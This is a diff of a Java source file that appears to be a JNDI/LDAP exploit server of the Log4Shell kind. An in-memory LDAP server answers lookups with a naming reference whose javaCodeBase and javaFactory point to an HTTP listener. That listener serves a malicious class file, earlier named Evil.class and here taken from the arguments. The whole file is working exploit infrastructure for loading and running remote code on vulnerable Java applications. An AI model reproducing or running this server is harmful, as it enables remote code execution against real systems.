@@ -33,7 +33,7 @@ public  class  Server  {
         }
 
         setupLDAP(args[0], Integer.parseInt(args[1]));
-        setupHTTP(Integer.parseInt(args[2]));
+        setupHTTP(Integer.parseInt(args[2]), args[0].substring(args[0].indexOf('#') + 1));
     }
 
     private static void setupLDAP(String evilUrl, int port)
@@ -41,8 +41,8 @@ public  class  Server  {
     {
         InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
         config.setListenerConfigs(new InMemoryListenerConfig(
-            "listen" ,
-            InetAddress.getByName( "0.0.0.0" ),
+            "listen",
+            InetAddress.getByName("0.0.0.0"),
             port,
             ServerSocketFactory.getDefault(),
             SocketFactory.getDefault(),
@@ -51,17 +51,17 @@ public  class  Server  {
 
         config.addInMemoryOperationInterceptor(new OperationInterceptor( new URL(evilUrl)));
         InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-        System.out.println( "LDAP server listening on 0.0.0.0:" + port);
+        System.out.println("LDAP server listening on 0.0.0.0:" + port);
         ds.startListening();
     }
 
-    private static void setupHTTP(int port) throws IOException {
-        byte[] targetArray = readEvil();
+    private static void setupHTTP(int port, String className) throws IOException {
+        byte[] targetArray = readClass(className); // get class passed on args
 
         Undertow server = Undertow.builder()
             .addHttpListener(port, "0.0.0.0")
 
-            // keep it simple - any request returns our Evil.class
+            // each request returns required class
             .setHandler(exchange -> {
                 exchange.getResponseHeaders().put(Headers.CONTENT_TYPE, "application/octet-stream");
                 exchange.getResponseSender().send(ByteBuffer.wrap(targetArray));
@@ -71,8 +71,8 @@ public  class  Server  {
         server.start();
     }
 
-    private static byte[] readEvil() throws IOException {
-        InputStream is = Server.class.getClassLoader().getResourceAsStream("Evil.class");
+    private static byte[] readClass(String className) throws IOException {
+        InputStream is = Server.class.getClassLoader().getResourceAsStream(className + ".class");
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
 
         int nRead;
@@ -87,7 +87,6 @@ public  class  Server  {
     }
 
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
-
         private final URL codebase;
 
         public OperationInterceptor(URL cb) {
@@ -98,6 +97,8 @@ public  class  Server  {
         public void processSearchResult(InMemoryInterceptedSearchResult result) {
             String base = result.getRequest().getBaseDN();
             Entry entry = new Entry(base);
+
+            System.out.println(base);
 
             try {
                 sendResult(result, base, entry);
@@ -112,16 +113,22 @@ public  class  Server  {
             URL turl = new URL(
                 this.codebase, this.codebase.getRef().replace('.', '/').concat(".class")
             );
+
             System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
+
             e.addAttribute("javaClassName", "foo");
+
             String cbstring = this.codebase.toString();
+
             int refPos = cbstring.indexOf('#');
             if (refPos > 0) {
                 cbstring = cbstring.substring(0, refPos);
             }
+
             e.addAttribute("javaCodeBase", cbstring);
             e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
             e.addAttribute("javaFactory", this.codebase.getRef());
+
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
